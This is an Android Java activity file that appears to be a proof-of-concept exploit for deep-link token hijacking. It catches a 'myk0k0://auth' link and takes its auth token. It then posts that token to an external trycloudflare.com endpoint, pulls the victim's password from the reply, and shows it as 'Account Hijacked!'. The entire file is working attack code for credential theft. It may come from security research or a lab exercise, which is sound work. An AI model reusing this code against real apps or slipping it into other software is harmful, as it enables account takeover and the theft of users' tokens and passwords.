package com.example.finaldeeplink;

import android.annotation.SuppressLint;
import android.net.Uri;
import android.os.Bundle;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

import com.example.finaldeeplink.R;

import okhttp3.*;

import org.json.JSONObject;
import java.io.IOException;
public class MainActivity extends AppCompatActivity {
    private static final String PROFILE_URL = "https://seas-attempts-become-checklist.trycloudflare.com/api.php";
    private TextView stolen_data;
    private OkHttpClient client;

    @SuppressLint("MissingInflatedId")
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        stolen_data = findViewById(R.id.stolen_data);
        client = new OkHttpClient();
        Uri data = getIntent().getData();

        if (data != null) {
            // Handle both deep link scenarios
            if ("myk0k0".equals(data.getScheme()) && "auth".equals(data.getHost())) {
                String auth_token = data.getQueryParameter("token");
              //  String auth_token = data.getQueryParameter("auth_token");
                fetchUserData("get_user_info", auth_token);
            }

        }
    }

    private void fetchUserData(String actionToken, String authToken) {
        try {
            String fullUrl = PROFILE_URL + "?token=" + actionToken;
            RequestBody body = RequestBody.create("{}", MediaType.parse("application/json"));

            Request request = new Request.Builder()
                    .url(fullUrl)
                    .addHeader("Authorization", authToken)
                    .post(body)
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onResponse(Call call, Response response) throws IOException {
                    try {
                        String responseData = response.body().string();
                        JSONObject jsonResponse = new JSONObject(responseData);
                        JSONObject user = jsonResponse.getJSONObject("user");

                        String password = user.getString("password");
                        String result = "Account Hijacked!\nPassword: " + password;
                        runOnUiThread(() -> stolen_data.setText(result));
                    } catch (Exception e) {
                        runOnUiThread(() -> stolen_data.setText("Decryption failed"));
                    }
                }

                @Override
                public void onFailure(Call call, IOException e) {
                    runOnUiThread(() -> stolen_data.setText("Exploit failed"));
                }
            });
        } catch (Exception e) {
            stolen_data.setText("Error in exploit chain");
        }
    }
}